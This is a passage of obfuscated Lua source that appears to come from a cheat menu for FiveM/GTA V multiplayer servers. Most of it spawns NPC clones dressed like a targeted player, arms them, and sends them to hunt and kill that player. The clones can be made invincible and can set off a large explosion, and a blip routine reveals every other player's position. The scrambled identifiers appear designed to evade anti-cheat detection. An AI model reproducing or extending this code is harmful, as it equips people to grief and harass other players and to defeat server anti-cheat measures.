                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 11, aux_drawable, aux_texture, aux_palette)

                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 11, aux_drawable, aux_texture, aux_palette)

                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 11, aux_drawable, aux_texture, aux_palette)
                elseif ped == 102 then
                    local persontofuck = nlFXKkFxuKQAk.natives.GetPlayerPed(ClonedP)
                    local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 0)
                    local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 0)
                    local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 1)
                    local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 1)
                    local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 2)
                    local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 2)
                    local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 6)
                    local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 6)
                    local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 7)
                    local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 7)
                    local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 0)
                    local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 0)
                    local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 0)
                    local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 1)
                    local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 1)
                    local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 1)
                    local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 2)
                    local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 2)
                    local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 2)
                    local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 3)
                    local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 3)
                    local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 3)
                    local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 4)
                    local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 4)
                    local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 4)
                    local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 5)
                    local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 5)
                    local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 5)
                    local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 6)
                    local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 6)
                    local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 6)
                    local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 7)
                    local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 7)
                    local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 7)
                    local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 8)
                    local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 8)
                    local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 8)
                    local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 9)
                    local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 9)
                    local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 9)
                    local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 10)
                    local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 10)
                    local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 10)
                    local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 11)
                    local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 11) 	
                    local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 11)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 11, aux_drawable, aux_texture, aux_palette)

                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 11, aux_drawable, aux_texture, aux_palette)

                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp2, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 11, aux_drawable, aux_texture, aux_palette)

                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp3, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 11, aux_drawable, aux_texture, aux_palette)
                end
                if isgod then
                    nlFXKkFxuKQAk.natives.SetEntityInvincible(peddrive, true)
                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedp1, true)
                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedp2, true)
                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedp3, true)
                end
                nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(peddrive, vehc, targetloc.x, targetloc.y, targetloc.z, 200.0, 2883621, 5)
                --ped 1
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(peddrive, RfPsUKHSFWJuBEJuz.rE.LumHash(wep), 200, false, true)
                nlFXKkFxuKQAk.natives.TaskCombatPed(peddrive, targetped, 0, 16)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(peddrive, 2, true)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(peddrive, 3, false)
                nlFXKkFxuKQAk.natives.SetPedCombatAbility(peddrive, 2)
                nlFXKkFxuKQAk.natives.SetPedCombatMovement(peddrive, 3)
                nlFXKkFxuKQAk.natives.SetCombatFloat(peddrive, 0, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(peddrive, 1, 6.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(peddrive, 3, 0.5)
                nlFXKkFxuKQAk.natives.SetCombatFloat(peddrive, 4, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(peddrive, 5, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(peddrive, 11, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(peddrive, 13, 0.01)
                nlFXKkFxuKQAk.natives.SetCombatFloat(peddrive, 14, 0.01)
                nlFXKkFxuKQAk.natives.SetPedAccuracy(peddrive, hitc)
                nlFXKkFxuKQAk.natives.SetPedFiringPattern(peddrive, -957453492)
                --ped 2
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(pedp1, RfPsUKHSFWJuBEJuz.rE.LumHash(wep), 200, false, true)
                nlFXKkFxuKQAk.natives.TaskCombatPed(pedp1, targetped, 0, 16)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedp1, 2, true)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedp1, 3, false)
                nlFXKkFxuKQAk.natives.SetPedCombatAbility(pedp1, 2)
                nlFXKkFxuKQAk.natives.SetPedCombatMovement(pedp1, 3)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp1, 0, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp1, 1, 6.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp1, 3, 0.5)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp1, 4, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp1, 5, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp1, 11, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp1, 13, 0.01)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp1, 14, 0.01)
                nlFXKkFxuKQAk.natives.SetPedAccuracy(pedp1, hitc)
                nlFXKkFxuKQAk.natives.SetPedFiringPattern(pedc, -957453492)
                --ped 3
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(pedp2, RfPsUKHSFWJuBEJuz.rE.LumHash(wep), 200, false, true)
                nlFXKkFxuKQAk.natives.TaskCombatPed(pedp2, targetped, 0, 16)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedp2, 2, true)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedp2, 3, false)
                nlFXKkFxuKQAk.natives.SetPedCombatAbility(pedp2, 2)
                nlFXKkFxuKQAk.natives.SetPedCombatMovement(pedp2, 3)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp2, 0, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp2, 1, 6.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp2, 3, 0.5)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp2, 4, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp2, 5, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp2, 11, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp2, 13, 0.01)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp2, 14, 0.01)
                nlFXKkFxuKQAk.natives.SetPedAccuracy(pedp2, hitc)
                nlFXKkFxuKQAk.natives.SetPedFiringPattern(pedp2, -957453492)
                --ped 4
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(pedp3, RfPsUKHSFWJuBEJuz.rE.LumHash(wep), 200, false, true)
                nlFXKkFxuKQAk.natives.TaskCombatPed(pedp3, targetped, 0, 16)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedp3, 2, true)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedp3, 3, false)
                nlFXKkFxuKQAk.natives.SetPedCombatAbility(pedp3, 2)
                nlFXKkFxuKQAk.natives.SetPedCombatMovement(pedp3, 3)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp3, 0, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp3, 1, 6.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp3, 3, 0.5)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp3, 4, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp3, 5, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp3, 11, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp3, 13, 0.01)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedp3, 14, 0.01)
                nlFXKkFxuKQAk.natives.SetPedAccuracy(pedp3, hitc)
                nlFXKkFxuKQAk.natives.SetPedFiringPattern(pedp3, -957453492)
                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                    while true do
                        if nlFXKkFxuKQAk.natives.IsPedDeadOrDying(targetped, 1) then
                            if not nlFXKkFxuKQAk.natives.IsPedDeadOrDying(peddrive, 1) then
                                if isexploade then
                                    local finalloc = nlFXKkFxuKQAk.natives.GetEntityCoords(peddrive, false)
                                    nlFXKkFxuKQAk.natives.SetEntityInvincible(vehc, false)
                                    nlFXKkFxuKQAk.natives.SetEntityInvincible(peddrive, false)
                                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedp1, false)
                                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedp2, false)
                                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedp3, false)
                                    nlFXKkFxuKQAk.natives.AddExplosion(finalloc.x, finalloc.y, finalloc.z, 2, 100000.0, true, false, 0)
                                    return
                                end
                                nlFXKkFxuKQAk.natives.ClearPedTasks(peddrive)
                                nlFXKkFxuKQAk.natives.ClearPedTasks(pedp1)
                                nlFXKkFxuKQAk.natives.ClearPedTasks(pedp2)
                                nlFXKkFxuKQAk.natives.ClearPedTasks(pedp3)
                                nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(peddrive, vehc, -558.2048, -2869.4, 8.888, 200.0, 2883621, 5)
                                return
                            else
                                return
                            end
                        else
                            if nlFXKkFxuKQAk.natives.IsPedDeadOrDying(pedp1, 1) and nlFXKkFxuKQAk.natives.IsPedDeadOrDying(pedp2, 1) and nlFXKkFxuKQAk.natives.IsPedDeadOrDying(pedp3, 1) then
                                nlFXKkFxuKQAk.natives.ClearPedTasksImmediately(peddrive)
                                return
                            elseif nlFXKkFxuKQAk.natives.IsPedDeadOrDying(peddrive, 1) then
                                return
                            end
                            local targetloc = nlFXKkFxuKQAk.natives.GetEntityCoords(targetped, false)
                            local targetpedloc = nlFXKkFxuKQAk.natives.GetEntityCoords(peddrive, false)
                            --SetNewWaypoint(targetpedloc.x, targetpedloc.y)
                            nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(peddrive, vehc, targetloc.x, targetloc.y, targetloc.z, 200.0, 2883621, 5)
                            nlFXKkFxuKQAk.natives.TaskCombatPed(peddrive, targetped, 0, 16)
                            nlFXKkFxuKQAk.natives.TaskCombatPed(pedp1, targetped, 0, 16)
                            nlFXKkFxuKQAk.natives.TaskCombatPed(pedp2, targetped, 0, 16)
                            nlFXKkFxuKQAk.natives.TaskCombatPed(pedp3, targetped, 0, 16)
                            nlFXKkFxuKQAk.natives.SetPedInfiniteAmmoClip(peddrive, true)
                            nlFXKkFxuKQAk.natives.SetPedInfiniteAmmoClip(pedp1, true)
                            nlFXKkFxuKQAk.natives.SetPedInfiniteAmmoClip(pedp2, true)
                            nlFXKkFxuKQAk.natives.SetPedInfiniteAmmoClip(pedp3, true)
                            RfPsUKHSFWJuBEJuz.rE.LumWait(100)
                        end
                        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                    end
                end)
            end
        end,
        magnetothrower = function(entity, position, angleFreq, dampRatio)
            local pos1 = jrnyLearIyzKiSIen.func.scalesomevectors(jrnyLearIyzKiSIen.func.subtractsomevectors(position, nlFXKkFxuKQAk.natives.GetEntityCoords(entity)), (angleFreq * angleFreq))
            local pos2 = jrnyLearIyzKiSIen.func.addsomevectors(jrnyLearIyzKiSIen.func.scalesomevectors(nlFXKkFxuKQAk.natives.GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), RfPsUKHSFWJuBEJuz.rE.LumVector3(0.0, 0.0, 0.1))
            local targetPos = jrnyLearIyzKiSIen.func.subtractsomevectors(pos1, pos2)
            nlFXKkFxuKQAk.natives.ApplyForceToEntity(entity, 3, targetPos, 0, 0, 0, false, false, true, true, false, true)
        end,
        DaBlipers = function(remove)
            if remove or not jrnyLearIyzKiSIen.config.features.PBlips or not jrnyLearIyzKiSIen.config.dienow then
                if remove or #jrnyLearIyzKiSIen.Blips > 0 then
                    for src, blip in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.Blips) do
                        nlFXKkFxuKQAk.natives.RemoveBlip(blip)
                        jrnyLearIyzKiSIen.Blips[src] = nil
                    end
                end
                return
            end
            for src, blip in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.Blips) do
                if not nlFXKkFxuKQAk.natives.DoesEntityExist(nlFXKkFxuKQAk.natives.GetPlayerPed(src)) then
                    nlFXKkFxuKQAk.natives.RemoveBlip(blip)
                    jrnyLearIyzKiSIen.Blips[src] = nil
                else
                    local coords = nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(src, 0.0, 0.0, 0.0))
                    local head = nlFXKkFxuKQAk.natives.GetEntityHeading(nlFXKkFxuKQAk.natives.GetPlayerPed(src))
                    nlFXKkFxuKQAk.natives.SetBlipCoords(blip, coords.x, coords.y, coords.z)
                    nlFXKkFxuKQAk.natives.SetBlipRotation(blip, RfPsUKHSFWJuBEJuz.rE.LumMath.LumCeli(head))
                    nlFXKkFxuKQAk.natives.SetBlipCategory(blip, 7)
                    nlFXKkFxuKQAk.natives.SetBlipScale(blip, 0.87)
                end
            end
            local plist = nlFXKkFxuKQAk.natives.GetActivePlayers()
            jrnyLearIyzKiSIen.func.table_removekey(plist, nlFXKkFxuKQAk.natives.PlayerId())
            for id, src in RfPsUKHSFWJuBEJuz.rE.Lumpairs(plist) do
                src = RfPsUKHSFWJuBEJuz.rE.LumToNum(src)
                if nlFXKkFxuKQAk.natives.DoesEntityExist(nlFXKkFxuKQAk.natives.GetPlayerPed(src)) and not jrnyLearIyzKiSIen.Blips[src] then
                    local coords = nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(src, 0.0, 0.0, 0.0))
                    local head = nlFXKkFxuKQAk.natives.GetEntityHeading(nlFXKkFxuKQAk.natives.GetPlayerPed(src))
                    local blip = nlFXKkFxuKQAk.natives.AddBlipForCoord(coords.x, coords.y, coords.z)
                    nlFXKkFxuKQAk.natives.SetBlipSprite(blip, 1)
                    nlFXKkFxuKQAk.natives.ShowHeadingIndicatorOnBlip(blip, true)
                    nlFXKkFxuKQAk.natives.SetBlipRotation(blip, RfPsUKHSFWJuBEJuz.rE.LumMath.LumCeli(head))
                    nlFXKkFxuKQAk.natives.SetBlipScale(blip, 0.87)
                    nlFXKkFxuKQAk.natives.SetBlipCategory(blip, 7)
                    nlFXKkFxuKQAk.natives.BeginTextCommandSetBlipName("STRING")
